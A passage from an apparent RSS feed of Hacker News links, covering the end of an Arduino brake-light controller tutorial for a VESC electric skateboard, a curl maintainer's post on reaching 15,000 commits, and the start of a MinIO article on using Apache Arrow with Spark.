ize%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253Eport%2520%253D%2520port%253B%250A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520void%2520addCommandHandler(vesc_command_id%2520commandId%252C%2520vesc_command_handler_callback%2520callback)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520vesc_command_handler%2520handler%2520%253D%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.commandId%2520%253D%2520commandId%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.callback%2520%253D%2520callback%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520realloc(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(this-%253EcommandHandlerSize%2520%252B%25201)%2520*%2520sizeof(vesc_command_handler)%250A%2520%2520%2520%2520%2520%2520%2520%2520)%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bthis-%253EcommandHandlerSize%252B%252B%255D%2520%253D%2520handler%253B%250A%2520%2520%2520%2520%257D%250A%250A%250A%2520%2520%2520%2520bool%2520checkVescPacket()%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520payload%255B256%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520payloadSize%2520%253D%2520receivePacket(payload)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520if%2520(payloadSize%2520%253E%25200)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520commandId%2520%253D%2520payload%255B0%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520for%2520(uint8_t%2520i%2520%253D%25200%253B%2520i%2520%253C%2520this-%253EcommandHandlerSize%253B%2520i%252B%252B)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520(this-%253EcommandHandlers%255Bi%255D.commandId%2520%253D%253D%2520commandId)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bi%255D.callback(payload%252C%2520payloadSize)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520VESC%2520Packet%253A%2520%2522)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.println(command)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520true%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520false%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%257D%250A%250Aprivate%253A%250A%2520%2520%2520%2520HardwareSerial%2520*port%253B%250A%2520%2520%2520%2520vesc_command_handler%2520*commandHandlers%253B%250A%2520%2520%2520%2520uint8_t%2520commandHandlerSize%253B%250A%250A%2520%2520%2520%2520static%2520bool%2520unpackPayload(uint8_t%2520*packet%252C%2520uint16_t%2520length%252C%2520uint8_t%2520*payload)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcMessage%2520%253D%25200%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcPayload%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%253D%2520packet%255Blength%2520-%25203%255D%2520%253C%253C%25208u%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%2526%253D%25200xFF00u%253B%250A%2520%2520%2520%2520%2520%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--26-.png" alt="carbon--26-"></a></p>
<!--kg-card-end: markdown--><h3 id="final-wrap">Final Wrap</h3><p>After having a way to hook into received VESC Commands, it's pretty easy to implement our simple LED dimming logic.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523include%2520%253CArduino.h%253E%250A%250A%2523define%2520DEBUG_PORT%2520Serial%250A%250A%2523include%2520%2522VescUart.h%2522%250A%250A%2523define%2520LED_DIMMER_PWM%25205%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520LED%2520DIMMER%2520PWM%2520PIN%2520(PWM%2520Compatible%2520PIN)%250A%2523define%2520LED_STATE_ON_POWER%2520HIGH%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520HIGH%252FLOW%2520when%2520power%2520is%2520applied%2520to%2520MCU%250A%2523define%2520LED_BRIGHTNESS_ON_IDLE%2520115%2520%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%2523define%2520LED_BRIGHTNESS_ON_BRAKE%2520255%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%250A%2523define%2520THROTTLE_MIDDLE%2520127%250A%250AVescUart%2520*vescUart%253B%250A%250Avoid%2520handleSetChuckDataCommand(uint8_t%2520*payload%252C%2520uint16_t%2520length)%2520%257B%250A%2520%2520%2520%2520uint8_t%2520vescThrottleValue%2520%253D%2520payload%255B2%255D%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520new%2520throttle%2520value%253A%2520%2522)%253B%250A%2520%2520%2520%2520DEBUG_PORT.println(vescThrottleValue)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(vescThrottleValue%2520%253C%2520THROTTLE_MIDDLE)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_BRAKE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520setup()%2520%257B%250A%2520%2520%2520%2520pinMode(LED_DIMMER_PWM%252C%2520OUTPUT)%253B%250A%250A%2520%2520%2520%2520Serial1.begin(115200)%253B%250A%2520%2520%2520%2520vescUart%2520%253D%2520new%2520VescUart(%2526Serial1)%253B%250A%250A%2520%2520%2520%2520vescUart-%253EaddCommandHandler(COMM_SET_CHUCK_DATA%252C%2520handleSetChuckDataCommand)%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.begin(9600)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(LED_STATE_ON_POWER%2520%253D%253D%2520HIGH)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520digitalWrite(LED_DIMMER_PWM%252C%2520LOW)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520loop()%2520%257B%250A%2520%2520%2520%2520vescUart-%253EcheckVescPacket()%253B%250A%257D%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--27-.png" alt="carbon--27-"></a></p>
<!--kg-card-end: markdown--><p>Compile and upload the code into Arduino, and it is ready to go.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-78.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-78.png 600w, https://www.techprowd.com/content/images/2020/09/image-78.png 970w" sizes="(min-width: 720px) 720px"></figure><p>You probably thinking, where is the DEMO? You wrote so much code and made a whole article, but there is no demo?</p><p>This project was basically done over the evening. Because of the timezone difference between me and Lithuania is 6 hours, I will not be able to get the demo video, but I will post it on <a href="https://twitter.com/techprowd">@techprowd</a> twitter and update the article after I receive it.</p><p>The final code archive will be uploaded on my <a href="http://patreon.com/techprowd">Patreon</a> for supporters, and I will be able to help with questions regarding how to use it there too!</p><p>I would like to include a shoutout to my father's company and an online store called <a href="https://shop.3dservisas.eu/?utm_source=techprowd">3DServisas</a>. It is primarily oriented to CNC machine custom orders, electric skateboard &amp; mountainboard parts, from gear drives to skateboard trucks.</p><p>If you are interested in building your own electric skateboard or mountainboard, go check out 3DServisas precision gear drives used by many production board makers such as <a href="https://www.bioboards.se/?utm_source=techprowd">BioBoards</a> and DIY players.</p><figure><a href="http://shop.3dservisas.eu/?utm_source=techprowd"><div><p>3DServisas Shop</p><p>CNC Machined goods</p><p><img src="http://cdn.shopify.com/s/files/1/2408/6975/files/3DServisas-logo-1_0_5x_150x150.png?v=1558443632"><span>3DServisas</span></p></div><p><img src="https://cdn.shopify.com/s/files/1/2408/6975/files/logo.png?height=628&amp;pad_color=fff&amp;v=1506788900&amp;width=1200"></p></a></figure><p>Instagram page: <a href="https://www.instagram.com/3dservisas/">https://www.instagram.com/3dservisas/</a></p><h2 id="announcement">Announcement</h2><p>I don't know if you have read my previous articles, but I have opened a Patreon account so you guys could help me by supporting my projects!</p><figure><a href="https://www.patreon.com/techprowd"><div><p>Techprowd is creating articles about software/electronics/cad and other DIY ideas | Patreon</p><p>Patreon is a membership platform that makes it easy for artists and creators to get paid. Join over 200,000 creators earning salaries from over 6 million monthly patrons.</p><p><img src="https://c5.patreon.com/external/favicon/apple-touch-icon.png?v=jw6AR4Rg74"><span>Patreon</span></p></div><p><img src="https://c10.patreonusercontent.com/3/eyJ3Ijo5NjB9/patreon-media/p/campaign/5333287/24fe815b9d214942af49618835ab1447/1.png?token-time=1601769600&amp;token-hash=d-6szlXLAeDC-Z1fx0vSdZvUw7AZpC7CEZ2uYFpFrNw%3D"></p></a></figure><p>If you are not interested in supporting, at least I suggest subscribing to the newsletters down bellow. Every new article will be delivered in a friendly email, readable format straight into your mailbox!</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to techprowd</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517767</guid>
            <pubDate>Fri, 18 Sep 2020 15:12:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My first 15,000 curl commits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24517595">thread link</a>) | @caution
<br/>
September 18, 2020 | https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I’ve long maintained that <strong>persistence</strong> is one of the main qualities you need in order to succeed with your (software) project. In order to manage to ship a product that truly conquers the world. By continuously and never-ending keeping at it: polishing away flaws and adding good features. On and on and on.</p>



<p>Today marks the day when I landed my 15,000th commit in the <a href="https://github.com/curl/curl">master branch in curl’s git repository</a> – and we don’t do merge commits so this number doesn’t include such. Funnily enough, <a href="https://github.com/curl/curl/graphs/contributors">GitHub can’t count</a> and shows a marginally lower number.</p>



<figure><img loading="lazy" width="844" height="116" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits.png 844w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-450x62.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-200x27.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/15000-commits-768x106.png 768w" sizes="(max-width: 844px) 100vw, 844px"></figure>



<p>This is of course a totally meaningless number and I’m only mentioning it here because it’s even and an opportunity for me to celebrate something. To cross off an imaginary milestone. This is not even a year since we passed <a href="https://daniel.haxx.se/blog/2019/11/29/curl-25000-commits/" data-type="post" data-id="12859">25,000 total number of commits</a>. Another meaningless number.</p>



<p>15,000 commits equals 57% of all commits done in curl so far and it makes me the only committer in the curl project with over 10% of the commits.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#daniel-vs-rest"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard1-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>The curl git history starts on December 29 1999, so the first 19 months of commits from the early curl history are lost. 15,000 commits over this period equals a little less than 2 commits per day on average. I reached 10,000 commits  in December 2011, so the latest 5,000 commits were done at a slower pace than the first 10,000.</p>



<p>I estimate that I’ve spent more than 15,000 hours working on curl over this period, so it would mean that I spend more than one hour of “curl time” per commit on average. According to <a href="https://curl.haxx.se/gitstats/authors.html">gitstats</a>, these 15,000 commits were done on 4,271 different days.</p>



<p>We also have other curl repositories that aren’t included in this commit number. For example, I have done over 4,400 commits in curl’s website repository.</p>



<p>With these my first 15,000 commits I’ve added 627,000 lines and removed 425,000, making an average commit adding 42 and removing 28 lines. (Feels pretty big but I figure the really large ones skew the average.)</p>



<p>The largest time gap ever between two of my commits in the curl tree is almost 35 days back in June 2000. If we limit the check to “modern times”, as in 2010 or later, there was a 19 day gap in July 2015. I <em>do</em> take vacations, but I usually keep up with the most important curl development even during those.</p>



<p>On average it is one commit done by me every 12.1 hours. Every 15.9 hours since 2010. </p>



<p>I’ve been working <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">full time on curl since early 2019</a>, up until then it was a spare time project only for me. Development with pull-requests and CI and things that verify a lot of the work <em>before</em> merge is a recent thing so one explanation for a slightly higher commit frequency in the past is that we then needed more “oops” commits to rectify mistakes. These days, most of them are done in the PR branches that are squashed when subsequently merged into master. Fewer commits with higher quality.</p>



<h2>curl committers</h2>



<p>We have merged commits authored by over 833 authors into the curl master repository.  Out of these, 537 landed only a single commit (so far).</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#authors"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard2-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 48 authors who ever wrote 10 or more commits within the same year. 20 of us committed that amount of commits during more than one year.</p>



<figure><a href="https://curl.haxx.se/dashboard1.html#coreteam-per-year"><img loading="lazy" width="1200" height="675" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1200x675.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-450x253.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-200x113.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-768x432.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-1536x864.png 1536w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-curl-Project-status-dashboard3-2048x1152.png 2048w" sizes="(max-width: 1200px) 100vw, 1200px"></a></figure>



<p>We are 9 authors who wrote more than 1% of the commits each.</p>



<p>We are 5 authors who ever wrote 10 or more commits within the same year in 10 or more years.</p>



<p>Our second-most committer (by commit count) has not merged a commit for over seven years.</p>



<p>To reach curl’s top-100 committers list right now, you only need to land 6 commits.</p>



<h2>can I keep it up?</h2>



<p>I intend to stick around in the curl project going forward as well. If things just are this great and life remains fine, I hope that I will be maintaining roughly this commit speed for years to come. My prediction is therefore that it will take longer than another twenty years to reach 30,000 commits.</p>



<p>I’ve worked on curl and its precursors for almost <em>twenty-four years</em>. In another twenty-four years I will be well into my retirement years. At some point I will probably not be fit to shoulder this job anymore!</p>



<p>I have never planned long ahead before and I won’t start now. I will instead keep focused on keeping curl top quality, an exemplary open source project and a welcoming environment for newcomers and oldies alike. I will continue to make sure the project is able to function totally independently if I’m present or not.</p>



<h2>The 15,000th commit?</h2>



<p>So what exactly did I change in the project when I merged my 15,000th ever change into the branch?</p>



<p>It was a pretty boring and <a href="https://github.com/curl/curl/commit/559ed3ca2545c56a9acc4e805970434f657bd691">non-spectacular one</a>. I removed a document (<code>RESOURCES</code>) from the docs/ folder as that has been a bit forgotten and now is just completely outdated. There’s a much better page for this provided on the web site: <a href="https://curl.haxx.se/rfc/">https://curl.haxx.se/rfc/</a></p>



<h2>Celebrations!</h2>



<p>I of coursed asked my twitter friends a few days ago on how this occasion is best celebrated:</p>



<figure><a href="https://twitter.com/bagder/status/1302345161272418307"><img loading="lazy" width="825" height="493" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png" alt="" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish.png 825w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-450x269.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-200x120.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2020/09/Screenshot_2020-09-15-Twitter-Publish-768x459.png 768w" sizes="(max-width: 825px) 100vw, 825px"></a></figure>



<p>I showed these results to my wife. She approved.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/18/my-first-15000-curl-commits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517595</guid>
            <pubDate>Fri, 18 Sep 2020 14:59:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Apache Arrow to Enhance the Performance of MinIO Data Lakes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517507">thread link</a>) | @jtsymonds
<br/>
September 18, 2020 | https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/ | <a href="https://web.archive.org/web/*/https://blog.min.io/turbocharging-minio-datalakes-with-arrowrdd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>More and more enterprises have begun or have already implemented a data lake strategy based on some of the work we did a couple of years ago. If you want to take a moment to review - you can find those posts below <a href="https://blog.min.io/modern-data-lake-with-minio-part-1/">here</a> and <a href="https://blog.min.io/modern-data-lake-with-minio-part-2/">here</a>. </p><h2 id="objective">Objective</h2><p>In this article, I am going to explain a mechanism to turbocharge the use of MinIO. Nothing changes as far as MinIO is concerned, the optimization will be on the underlying storage of our data. We are going to choose one of the latest formats to improve agility manifoldly. We are going to show the ways by which your data lake data can travel across systems without experiencing any "conversion" time. </p><h2 id="apache-arrow">Apache Arrow</h2><p>I believe understanding this article needs some basic concepts of<a href="https://arrow.apache.org/"> </a>how applications like Spark works. Let me explain it in simple terms.</p><p>Imagine you got a nice job at a location different from where you live currently and you want to relocate, as the new company demands it and pays for it. You have got the most modern televisions, refrigerators, super soft leather sofas, bed and so on. You engage a moving company, who comes, disassembles everything, packs it conveniently. They also make sure to pack as much possible in containers to fill the truck such that they can do it in a single trip. Once they reach the destination, they unpack, assembles and restore everything as it was.</p><p>The same applies to data. When I store some data in MinIO , and I need to feed it to, say, another application, say Spark, the consuming application needs to disassemble the data from MinIO data lake, pack it and transport it through the wire (or wireless), receive, unpack and re-assemble. </p><p>Let's use more technical terms for this disassembly and assembly - serialization and de-serialization of data. The unfortunate part is, both these processes are complex and time consuming. Here is a brief diagram illustrating what happens in Apache Spark when it reads data</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-1.54.30-AM.png 1944w" sizes="(min-width: 720px) 720px"><figcaption>Experimental setup. Courtesy: <a href="https://databricks.com/session/running-apache-spark-on-a-high-performance-cluster-using-rdma-and-nvme-flash">Spark Summit</a></figcaption></figure><p>You may not have noticed this problem before. Assume that MinIO is on a machine(s) on the network. We write a Spark Map-Reduce application. Eventhough the network limit is 100 GbE, we are almost getting less that 10 GbE speed. What's the use of this high speed network then? What is the potential problem which is not allowing us to utilize the full potential of the network, or at least 70-80% of it?</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-2.00.34-AM.png 1948w" sizes="(min-width: 720px) 720px"><figcaption>Additional layers, buffers and serializers</figcaption></figure><p>The issues are with the way in which Spark is retrieving the data. Look at the number of layers the data has to pass though. This creates a limit on the throughput that we can achieve. There are projects like <a href="https://crail.apache.org/">Apache Crail,</a> which are designed to address these issues.</p><h2 id="optimization-columnar-data-format">Optimization : Columnar Data Format </h2><div><p>If we think about the relocation example mentioned above, we see that the logistic company will never take the sofa as it is, they will break it down to make it easy to transport. Note that this is for transportation purposes only - if that objective is different, then disassembling the sofa might not be the right approach. </p><p>Given that the objective for a data lake is analytics - rather than transactional needs we must take that under consideration. For transactions, we often use OLTP systems like Oracle or PostGres - given that they are particularly well suited for the job. A quick review of OLAP's analytics requirements is probably in order. </p></div><figure><img src="https://blog.min.io/content/images/2020/09/Picture1.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Picture1.png 600w, https://blog.min.io/content/images/2020/09/Picture1.png 966w" sizes="(min-width: 720px) 720px"><figcaption>Introducing columnar format</figcaption></figure><p>Let's start with one of the most famous RDMBS table - the "emp" table of Oracle. The top part shows how the data is stored in RDBMS as a "relation" or "tuple". We call it a table. I am providing you two queries</p><!--kg-card-begin: markdown--><ol>
<li>select ename from emp where job = 'CLERK'</li>
<li>select sum(sal) from emp</li>
</ol>
<!--kg-card-end: markdown--><p>The first is a transactional query. It has to scan every row on the table and find out the name of the employee wherever the job is clerk. The second is an analytical query - rather than an atomic result, the goal is a general result. Unfortunately, the first and second query has to scan through all the rows, if we use RDBMS way of representation of data. If the size of data is 20 GB, all the 20 GB more or less will be scanned. This is the top part of above figure.</p><p>Let's make some changes - taking all of our columns and make them into rows. Like a transpose of a matrix - and see the bottom part of above figure, how your data will look like. Following this transposition, an entire block is just representing one column. How many blocks need to be scanned for the second analytical query? Just one block, probably around 2 GB of size. </p><p>The difference is significant? Columnar representation is what is being used in ORC (Optimized Row Columnar) and Parquet files - with the goal of making the analytics faster.</p><p>Columnar formats are easier to read, however, they pose another problem - they are usually stored in compressed format. As a result, the consuming application will need to uncompress it while reading and compress it back while writing. </p><p>Note this, as we will revisit the point later.</p><h2 id="the-science-of-reading-writing-data">The Science of Reading/Writing Data</h2><p>Let me explain briefly how reading/writing happens in a software system and what role is played by the hardware.</p><p>Microprocessors normally use two methods to connect external devices: <strong>memory mapped</strong> or <strong>port mapped</strong> I/O. </p><p>Memory mapped I/O is mapped into the same address space as program memory and/or user memory, and is accessed in the same way.</p><p>Port mapped I/O uses a separate, dedicated address space and is accessed via a dedicated set of microprocessor instructions.</p><p>In memory mapped approach, I/O devices are mapped into the system memory map along with RAM and ROM. To access a hardware device, simply read or write to those 'special' addresses using the normal memory access instructions.The advantage to this method is that every instruction which can access memory can be used to manipulate an I/O device.</p><p>Usually applications use Port mapped I/O. If we are using memory mapped I/O for a particular format, it will be faster, especially for analytical needs. When combined with our columnar data format, then it becomes even more advantageous.</p><p>Welcome to <a href="https://arrow.apache.org/">Apache Arrow</a>. </p><p>Arrow uses memory mapped I/O and avoids serialization/deserialization overheads when you convert between most of the formats while leveraging the columnar data format. </p><p>Thanks to <a href="https://wesmckinney.com/">Wes McKinney</a> for this brilliant innovation, its not a surprise that such an idea came from him and team, as he is well known as the creator of Pandas in Python. He calls Arrow as the future of data transfer.</p><h2 id="store-data-in-minio-in-arrow-format">Store Data in MinIO in Arrow Format</h2><p>This is how we are going to make MinIO even more powerful. </p><p>We are going to store that data in Arrow and then let the consuming applications read it - resulting in dramatically increased speeds. Step one has us putting the data into MinIO in Arrow format. I was using my own approach until I saw a much better implementation from <a href="https://github.com/BryanCutler">Bryan Cutler</a>, whose contributions include integrating Arrow formats to Spark as well.</p><p>We will start with a a .csv file, in this case movie ratings downloaded from the <a href="https://movielens.org/">movielens</a> site. For illustration purposes, I took about 100K rows. First, let's write a Spark program to read this CSV file and write it into Arrow format using Arrow RDD. You can get the full code from the link given towards the bottom of this article.</p><p>Step 1: build.sbt , please note the arrow dependencies</p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1600w, https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.38.17-AM.png 1990w" sizes="(min-width: 720px) 720px"><figcaption>See lines 18 and 19, we have Arrow related dependencies with Spark</figcaption></figure><p>We will use Spark 3.0, with Apache Arrow 0.17.1</p><p>The ArrowRDD class has an iterator and RDD itself. For creating a custom RDD, essentially you must override mapPartitions method. You can browse the code for details. </p><p>Next, start MinIO and create a bucket named "arrowbucket". </p><figure><img src="https://blog.min.io/content/images/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png" alt="" srcset="https://blog.min.io/content/images/size/w600/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 600w, https://blog.min.io/content/images/size/w1000/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 1000w, https://blog.min.io/content/images/size/w1600/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 1600w, https://blog.min.io/content/images/size/w2400/2020/09/Screen-Shot-2020-09-06-at-4.26.37-AM.png 